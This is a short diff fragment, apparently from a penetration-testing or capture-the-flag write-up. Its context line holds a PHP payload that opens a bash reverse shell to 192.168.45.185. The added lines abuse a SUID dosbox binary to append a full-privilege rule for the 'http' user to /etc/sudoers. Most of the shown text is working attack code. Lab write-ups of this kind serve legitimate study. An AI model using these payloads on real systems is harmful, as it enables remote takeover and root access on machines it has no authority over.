@@ -352,6 +352,9 @@ payload = '<?php passthru("bash -i >& /dev/tcp/192.168.45.185/22 0>&1"); ?>'
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid    
 -rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox
 
+# exploit
+LFILE='/etc/sudoers'
+./dosbox -c 'mount c /' -c "echo http ALL=(ALL) ALL >>c:$LFILE" -c exit
 ```
 
 ### Cockpit
